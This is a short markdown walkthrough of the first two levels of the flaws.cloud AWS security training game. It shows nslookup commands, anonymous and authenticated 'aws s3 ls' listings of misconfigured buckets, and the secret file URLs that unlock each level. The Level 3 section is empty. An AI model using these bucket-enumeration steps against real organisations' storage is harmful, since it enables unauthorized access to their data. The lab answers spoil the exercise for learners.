# Flaws

## Level 1
 
Use the command 

    $nslookup flaws.cloud 

to find the ip  address of the aws server flaws.cloud

Resultant ips :  

    Name:   flaws.cloud
    Address: 52.92.192.211
    Name:   flaws.cloud
    Address: 52.218.181.178
    Name:   flaws.cloud 
    Address: 52.218.153.82
    Name:   flaws.cloud
    Address: 52.92.249.155
    Name:   flaws.cloud
    Address: 52.218.229.98
    Name:   flaws.cloud
    Address: 52.218.196.163
    Name:   flaws.cloud
    Address: 52.92.181.83
    Name:   flaws.cloud
    Address: 52.218.240.99
Reverse lookup on the ip results on 
    
    name = s3-website-us-west-2.amazonaws.com
Using the command :

    $nslookup 52.218.181.178
    
Using the command:

    $aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
    
list the root files on the flaws.cloud as an anonymous id.

Result:

    2017-03-14 08:30:38       2575 hint1.html
    2017-03-03 09:35:17       1707 hint2.html
    2017-03-03 09:35:11       1101 hint3.html
    2020-05-22 23:46:45       3162 index.html
    2018-07-10 22:17:16      15979 logo.png
    2017-02-27 07:29:28         46 robots.txt
    2017-02-27 07:29:30       1051 secret-dd02c7c.html
    
    
Browse 

    https://flaws.cloud/secret-dd02c7c.html
    
to get into the next level

Link for the next level:

    http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    
## Level 2

Create an account in aws as with free tier.

Create a Iam user with access key and secret access key after creating the account.

After creating the user try enquiring or list the root directory as a verified user from the terminal after setting the aws cli with access key and secret access key.

command for listing:

    $aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
   
Output be like:

    2017-02-27 07:32:15      80751 everyone.png
    2017-03-03 09:17:17       1433 hint1.html
    2017-02-27 07:34:39       1035 hint2.html
    2017-02-27 07:32:14       2786 index.html
    2017-02-27 07:32:14         26 robots.txt
    2017-02-27 07:32:15       1051 secret-e4443fc.html
    
After getting the result browse the secret file and you will get the link for the next level.

    http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
    
## Level 3

